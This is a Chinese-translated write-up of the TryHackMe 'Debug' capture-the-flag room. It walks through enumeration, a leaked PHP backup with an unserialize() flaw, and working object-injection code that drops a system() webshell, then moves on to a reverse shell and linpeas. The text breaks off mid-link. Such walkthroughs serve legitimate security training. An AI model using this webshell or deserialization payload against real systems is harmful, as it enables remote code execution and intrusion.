<html>
<head>
<title>TryHackMe Debug Write-Up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe调试报告</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-debug-write-up-29ea0a7098f?source=collection_archive---------0-----------------------#2021-06-28">https://infosecwriteups.com/tryhackme-debug-write-up-29ea0a7098f?source=collection_archive---------0-----------------------#2021-06-28</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/3ec76a214d99cfe9a1b899297fc0674b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6-oLjY3VNBssfSkvUSdWoA.png"/></div></div></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jy"><img src="../Images/3a94e0fa3ec62b4ae8518746a25e7785.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jzh6-yPb-RF0eE2Q8CP8XA.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">TryHackMe上的调试室</figcaption></figure><div class="kh ki gp gr kj kk"><a href="https://tryhackme.com/room/debug" rel="noopener  ugc nofollow" target="_blank"><div class="kl ab fo"><div class="km ab kn cl cj ko"><h2 class="bd ir gy z fp kp fr fs kq fu fw ip bi translated">TryHackMe |调试</h2><div class="kr l"><h3 class="bd b gy z fp kp fr fs kq fu fw dk translated">Linux机器CTF！您将了解枚举、查找隐藏的密码文件以及如何利用php…</h3></div><div class="ks l"><p class="bd b dl z fp kp fr fs kq fu fw dk translated">tryhackme.com</p></div></div><div class="kt l"><div class="ku l kv kw kx kt ky jw kk"/></div></div></a></div><p id="3d9c" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">Debug是TryHackMe的一个免费房间，它围绕网页上存在的PHP反序列化漏洞展开</p><p id="2b16" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">让我们从nmap扫描开始</p><pre class="jz ka kb kc gt lx ly lz ma aw mb bi"><span id="4e0d" class="mc md iq ly b gy me mf l mg mh">nmap -sS -Pn -n -p- -vv -oA nmap/ports &lt;target ip&gt;</span><span id="0160" class="mc md iq ly b gy mi mf l mg mh">-sS - SYN scan<br/>-Pn - do not ping for host discovery<br/>-n - do not do DNS resolution<br/>-p- - scan all ports<br/>-vv - print ports as soon as they are discovered<br/>-oA - output the result in all nmap formats</span></pre><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mj"><img src="../Images/e94f064c60875fe9c719b21258392387.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e0p506NldobgFTP_aj8stg.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">nmap扫描部分结果</figcaption></figure><p id="1a71" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">扫描很快将端口22 (SSH)和端口80 (HTTP)列为开放</p><p id="b9d9" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">扫描完成时没有打开其他端口</p><p id="589f" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">让我们看看端口80上运行的是什么</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mk"><img src="../Images/fad63b766e33399ae7c5bfff54b4d169.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UtKA5iK3s1EbOzwv-L-ITg.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">Apache Ubuntu默认页面</figcaption></figure><p id="4189" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">一个apache默认页面，让我们用gobuster看看web服务器上有没有别的东西</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ml"><img src="../Images/2a27ebc85e61ba735571c3bdab7eae8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Sw3g3cToukdSz3zyul9YQw.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">gobuster扫描</figcaption></figure><pre class="jz ka kb kc gt lx ly lz ma aw mb bi"><span id="dd51" class="mc md iq ly b gy me mf l mg mh">gobuster dir -u <a class="ae mm" href="http://10.10.80.241/" rel="noopener ugc nofollow" target="_blank">http://10.10.80.241/</a> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 70 --random-agent -o gobuster-80.txt</span><span id="b64f" class="mc md iq ly b gy mi mf l mg mh">-u - the base url to check<br/>-w - wordlist to use<br/>-t - number of parallel threads<br/>--random-agent - use a random user agent instead of using "gobuster" as sometimes this causes gobuster to be blocked<br/>-o - output the result in a file</span></pre><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mn"><img src="../Images/926870e5460c7256d5879a28198bd6cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZW4xOvXRU-OI4eKoYn5UBA.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">有许多端点需要检查</figcaption></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/46ea5b0166d4de4200f9ba439c8ca970.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/format:webp/1*tYZhlJ44XI-3Xw-5WLN4WA.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">禁止使用/javascript</figcaption></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/59f297c17409fac96a84ab0c8e33ed7b.png" data-original-src="https://miro.medium.com/v2/resize:fit:968/format:webp/1*4f-DxtzimW4vnfQdcXertw.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">/备份路径</figcaption></figure><p id="8e55" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">/backup看起来很像基本的web根目录，为了检查这个假设，我们可以查看readme.md是否同时位于/backup/readme.md和/readme.md上</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/b6d6f4dec5987c578b137efa8f918adb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1192/format:webp/1*04SMXJF_qpxE0gbEZ44XFA.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">下载和检查readme.md文件</figcaption></figure><p id="1238" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">这两个文件是相同的</p><p id="b582" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">由于备份端点有一个index.html.bak，我猜主“生产”web根URL上应该有一个index.html</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mk"><img src="../Images/8e6a9abe33bab1548525fcd41f3d9b5b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9RZvim9oB-sZJ2xZdZaPLw.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">index.html</figcaption></figure><p id="b69b" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">事实上，这是apache的默认页面</p><p id="1d3c" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">index.php呢(。bak)是否存在于备份文件夹中？</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mr"><img src="../Images/6bf11e60190cfdd97e98440b4eda3f0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qAft4UEeDx6HoIe4dagfNg.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">index.php</figcaption></figure><p id="d137" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">事实上它是存在的！</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/12fe3e9d8eb1668507f988970defd2eb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iZLB-gZKA9l7TdrKpIEeAA.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">index.php表单</figcaption></figure><p id="2bad" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">此外，index.php页面有一个向管理员提交消息的表单</p><p id="4e99" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">但是，比表单更重要的是/backup目录中的index.php.bak，因为我们可以下载该文件，因为apache不会执行它，因为它不以php/php5/phtml扩展名结尾，所以它被视为任何文本文件</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/ee4266f0827a358451ea1d7b14b47e90.png" data-original-src="https://miro.medium.com/v2/resize:fit:1112/format:webp/1*s9ZgattgNjpaj1VSAZ1lxQ.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">下载index.php.bak</figcaption></figure><p id="a8c5" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">index.php.bak文件基本上是一个普通的HTML文件，只有一小段php代码</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mu"><img src="../Images/fce0f3c30dc454f5435b1626a1b6e8c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jjpQX5cJq8UAAPJcCXC3Kg.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">index.php.bak中的PHP代码</figcaption></figure><pre class="jz ka kb kc gt lx ly lz ma aw mb bi"><span id="0d27" class="mc md iq ly b gy me mf l mg mh">&lt;?php                                                                                                                                                                                                              <br/>                                                                                                                                                                                                                   <br/>class FormSubmit {                                                                                                                                                                                                 <br/>                                                                                                                                                                                                                   <br/>public $form_file = 'message.txt';                                                                                                                                                                                 <br/>public $message = '';                                                                                                                                                                                              <br/>                                                                                                                                                                                                                   <br/>public function SaveMessage() {                                                                                                                                                                                    <br/>                                                                                                                                                                                                                   <br/>$NameArea = $_GET['name']; <br/>$EmailArea = $_GET['email'];<br/>$TextArea = $_GET['comments'];</span><span id="a952" class="mc md iq ly b gy mi mf l mg mh">$this-&gt; message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";</span><span id="e5af" class="mc md iq ly b gy mi mf l mg mh">}</span><span id="3d18" class="mc md iq ly b gy mi mf l mg mh">public function __destruct() {</span><span id="29a9" class="mc md iq ly b gy mi mf l mg mh">file_put_contents(__DIR__ . '/' . $this-&gt;form_file,$this-&gt;message,FILE_APPEND);<br/>echo 'Your submission has been successfully saved!';</span><span id="2dd8" class="mc md iq ly b gy mi mf l mg mh">}</span><span id="8ae9" class="mc md iq ly b gy mi mf l mg mh">}</span><span id="818b" class="mc md iq ly b gy mi mf l mg mh">// Leaving this for now... only for debug purposes... do not touch!</span><span id="8cf2" class="mc md iq ly b gy mi mf l mg mh">$debug = $_GET['debug'] ?? '';<br/>$messageDebug = unserialize($debug);</span><span id="957a" class="mc md iq ly b gy mi mf l mg mh">$application = new FormSubmit;<br/>$application -&gt; SaveMessage();</span><span id="2d95" class="mc md iq ly b gy mi mf l mg mh">?&gt;</span></pre><p id="7040" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">该代码使用/index.php表单中的GET参数“name”、“email”和“comments ”,并为管理员创建一条消息</p><p id="cfa7" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">加载页面时，包含消息的PHP对象“FormSubmit”被创建，一旦创建，该对象就在PHP脚本执行结束时被删除</p><p id="6eea" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">在PHP中，当一个类的实例被删除时，如果对象类有__destruct()方法，这个__destruct()函数被调用</p><p id="bb3d" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">更多信息请点击此处</p><div class="kh ki gp gr kj kk"><a href="https://www.w3schools.com/php/php_oop_destructor.asp" rel="noopener  ugc nofollow" target="_blank"><div class="kl ab fo"><div class="km ab kn cl cj ko"><h2 class="bd ir gy z fp kp fr fs kq fu fw ip bi translated">PHP OOP析构函数</h2><div class="kr l"><h3 class="bd b gy z fp kp fr fs kq fu fw dk translated">当对象被析构或者脚本被停止或退出时，析构函数被调用。如果你创建了一个__destruct()…</h3></div><div class="ks l"><p class="bd b dl z fp kp fr fs kq fu fw dk translated">www.w3schools.com</p></div></div><div class="kt l"><div class="mv l kv kw kx kt ky jw kk"/></div></div></a></div><div class="kh ki gp gr kj kk"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md" rel="noopener  ugc nofollow" target="_blank"><div class="kl ab fo"><div class="km ab kn cl cj ko"><h2 class="bd ir gy z fp kp fr fs kq fu fw ip bi translated">swisskyrepo/payloads all things</h2><div class="kr l"><h3 class="bd b gy z fp kp fr fs kq fu fw dk translated">PHP对象注入是一个应用程序级别的漏洞，可能允许攻击者执行不同种类的…</h3></div><div class="ks l"><p class="bd b dl z fp kp fr fs kq fu fw dk translated">github.com</p></div></div><div class="kt l"><div class="mw l kv kw kx kt ky jw kk"/></div></div></a></div><p id="1859" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">代码中的__destruct()函数将变量“message”的内容创建/附加到一个以变量“form_file”的内容命名的文件中</p><p id="1aa8" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">因此，如果我们可以在“message”变量中传递一个PHP webshell，并将“form_file”设置为一个. PHP文件名，我们应该能够获得一个webshell</p><p id="7ef4" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">但是代码告诉我们，FormSubmit的唯一实例是以编程方式创建的，文件名总是“message.txt ”,消息来自表单输入字段</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mx"><img src="../Images/4ec1fadc56ef372f89f0b12500f3eb72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Qtp76Akof8s-vSl83xVw-g.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">测试表单</figcaption></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi my"><img src="../Images/8255c37fe78e7e2918f84181a569710f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/1*GQOxPr_vRL_h8KcoFiRIxw.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">检查提交结果</figcaption></figure><p id="1348" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">所以即使我们尝试注入PHP代码，它也不会像文件那样被执行。文本文件（textfile）</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mz"><img src="../Images/6d4678cb4a25917ff3ac72e61cd3ee9e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2EMBvlcNqixWz6U_qmSHAA.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">PHP代码执行测试</figcaption></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi na"><img src="../Images/fb493649597d731d84d4a470b0c35558.png" data-original-src="https://miro.medium.com/v2/resize:fit:1228/format:webp/1*O6nrp8ZUGaA1aZ0Y1lNhXw.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">检查我们是否有代码执行，我们没有</figcaption></figure><p id="3ef1" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">我们可以利用的代码中有趣的部分如下</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/4c88d862629ba117475dd1c9b44aeee5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1218/format:webp/1*YOZPoRUWS8bORJOIYhJeJg.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">index.php易受攻击的PHP代码</figcaption></figure><pre class="jz ka kb kc gt lx ly lz ma aw mb bi"><span id="26e4" class="mc md iq ly b gy me mf l mg mh">// Leaving this for now... only for debug purposes... do not touch!</span><span id="f463" class="mc md iq ly b gy mi mf l mg mh">$debug = $_GET['debug'] ?? '';<br/>$messageDebug = unserialize($debug);</span></pre><p id="8358" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">在这里，开发人员留下了对unserialize()的调用，当GET参数“debug”不为空时将使用该调用</p><p id="c177" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">unserialize()是一个接受字符串输入并从输入本身创建PHP对象的函数</p><p id="ce9d" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">因此，如果我们基于找到的代码在本地攻击机器/虚拟机上创建一个PHP“form submit”对象，将“message”设置为PHP web shell，将“form_file”设置为. PHP文件名，对其进行序列化，并将结果字符串作为index.php的GET“debug”参数的值发送，我们应该能够创建一个包含任意内容的PHP文件</p><p id="d9f8" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">让我们先做个测试</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/a6ca50d0797be2eb0bb927534d5fb971.png" data-original-src="https://miro.medium.com/v2/resize:fit:788/format:webp/1*vDkIEuLTkxWMLR7rhY530Q.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">攻击者机器上的PHP代码—exploit.php</figcaption></figure><pre class="jz ka kb kc gt lx ly lz ma aw mb bi"><span id="677d" class="mc md iq ly b gy me mf l mg mh">&lt;?php<br/>class FormSubmit {</span><span id="7ef0" class="mc md iq ly b gy mi mf l mg mh">public $form_file = 'file.notphp';<br/>public $message = 'test content';</span><span id="7bcc" class="mc md iq ly b gy mi mf l mg mh">}</span><span id="181f" class="mc md iq ly b gy mi mf l mg mh">print urlencode(serialize(new FormSubmit));<br/>?&gt;</span></pre><p id="5c16" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">上面的代码声明了一个名为“FormSubmit”的PHP类，创建了一个实例，对其进行序列化，然后对结果进行url编码，因为我们必须将结果发送到HTTP服务器</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nd"><img src="../Images/6c1c9c650fd12091a681765beb8c003c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nArWc20mxtWTVafPf-ApHw.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">序列化和URL编码的PHP对象</figcaption></figure><p id="9e12" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">让我们复制这个字符串，并在“调试”GET参数中将其发送给index.php</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ne"><img src="../Images/d9c8df1635cb195d2e858785f276bb03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UH7Li0eiTRj_hzBWjnbwyA.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">将有效载荷送往index.php</figcaption></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/206d46843137271506bcb24845105cf0.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/format:webp/1*IxgAAbuDET_k_1CdkheO2g.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">检查结果</figcaption></figure><p id="b550" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">在/file.notphp中，我们可以找到我们在exploit.php文件中设置的内容</p><p id="4719" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">因此，由于PHP对象是由unserialize()创建的，所以它在PHP代码执行结束时被删除，然后__destruct()创建了我们想要的文件</p><p id="bd6a" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">如果我们使用下面的代码创建一个序列化的对象会发生什么？</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/8b853f9881f3c92d127a14950e0d5273.png" data-original-src="https://miro.medium.com/v2/resize:fit:790/format:webp/1*oFjTolmqnw3RFc-AUs829g.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">exploit1.php</figcaption></figure><pre class="jz ka kb kc gt lx ly lz ma aw mb bi"><span id="431a" class="mc md iq ly b gy me mf l mg mh">&lt;?php<br/>class FormSubmit {</span><span id="0657" class="mc md iq ly b gy mi mf l mg mh">public $form_file = 'message.php';<br/>public $message = '&lt;?php<br/>    if(isset($_GET[\'cmd\']))<br/>    {<br/>        system($_GET[\'cmd\']);<br/>    }<br/>?&gt;';</span><span id="4797" class="mc md iq ly b gy mi mf l mg mh">}</span><span id="7e62" class="mc md iq ly b gy mi mf l mg mh">print urlencode(serialize(new FormSubmit));<br/>?&gt;</span></pre><p id="ce8a" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">这将使用GET参数“cmd”通过system()调用创建一个“message.php”文件，从而允许在目标机器上远程执行代码</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nd"><img src="../Images/762ed7c22e38a3a5f60f17c5137e5750.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*24loUZiqgLgx08uwnwQ6jg.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">序列化和URL编码的webshell</figcaption></figure><p id="f622" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">让我们复制这个字符串，并在“调试”GET参数中将其发送给index.php</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mr"><img src="../Images/c5f5284efcd9b7f4179ea6da40d402f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*40qA1SMNNdRGP0H-M5Aiow.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">将有效载荷送往index.php</figcaption></figure><p id="4b80" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">然后，在访问带有序列化PHP对象的URL之后，我们检查我们的webshell是否按预期工作</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/d9a191f13d6e5a9d75b90691afbb8fd9.png" data-original-src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*AYMgIN4CNtHfKkEv0f6xWw.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">正在尝试列出web根目录</figcaption></figure><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nh"><img src="../Images/dd0a67e6294d7a4a64dfd7c31c3846ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0tB7VvquqvtLPDA4G9RMCA.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">成功了！</figcaption></figure><p id="ffc0" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">为了以更简单的方式使用这个webshell，我将切换到Burp</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ni"><img src="../Images/9d0ef7bf68dd0fb5ed5e00d9b9663524.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sb4HUXlnblCBMgLT0aPd-Q.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">与之前的请求相同，但在打嗝套件上</figcaption></figure><p id="6f19" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">让我们将这个请求发送到repeater，看看我们是否能得到一个shell</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ms"><img src="../Images/065df3c77b01599938066b5c60c63df3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9C_fpuvUmxs5y--aAuAbfg.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">正在检查bash</figcaption></figure><p id="e488" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">的确，我们击中了目标</p><p id="dfe3" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">让我们看看pentestmonkey的一个简单的bash reverse shell是否有效</p><div class="kh ki gp gr kj kk"><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener  ugc nofollow" target="_blank"><div class="kl ab fo"><div class="km ab kn cl cj ko"><h2 class="bd ir gy z fp kp fr fs kq fu fw ip bi translated">反向外壳备忘单</h2><div class="kr l"><h3 class="bd b gy z fp kp fr fs kq fu fw dk translated">如果你足够幸运，在渗透测试中发现了一个命令执行漏洞，不久之后…</h3></div><div class="ks l"><p class="bd b dl z fp kp fr fs kq fu fw dk translated">pentestmonkey.net</p></div></div></div></a></div><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nj"><img src="../Images/78aeceb8c1300ed182495a9d8d77c537.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*50Tgo2RxRjPTQchlcKf6QA.png"/></div></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">获得反向外壳</figcaption></figure><p id="8af3" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">反向外壳工作，我们在目标机器上作为www-data！</p><figure class="jz ka kb kc gt jr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/2797bf3f9a179f113dade301af9dcba5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1366/format:webp/1*rIjATiWD0nXS1mqRfJxU8g.png"/></div><figcaption class="kd ke gj gh gi kf kg bd b be z dk translated">设置linpeas</figcaption></figure><p id="d293" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">在python3 http.server上设置linpeas.sh，以允许从目标机器下载</p><p id="be13" class="pw-post-body-paragraph kz la iq lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw ij bi translated">更多信息请点击此处</p><div class="kh ki gp gr kj kk"><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" rel="noopener  ugc nofollow" target="_blank"><div class="kl ab fo"><div class="km ab kn cl cj ko"><h2 class="bd ir gy z fp kp fr fs kq fu fw ip bi translated">Carlos polop/特权升级-牛逼-脚本-套件</h2><div class="kr l"><h3 class="bd b gy z fp kp fr fs kq fu fw dk translated">PEASS -特权升级真棒脚本套件(带颜色)…</h3></div><div class="ks l"><p class="bd b dl z fp kp 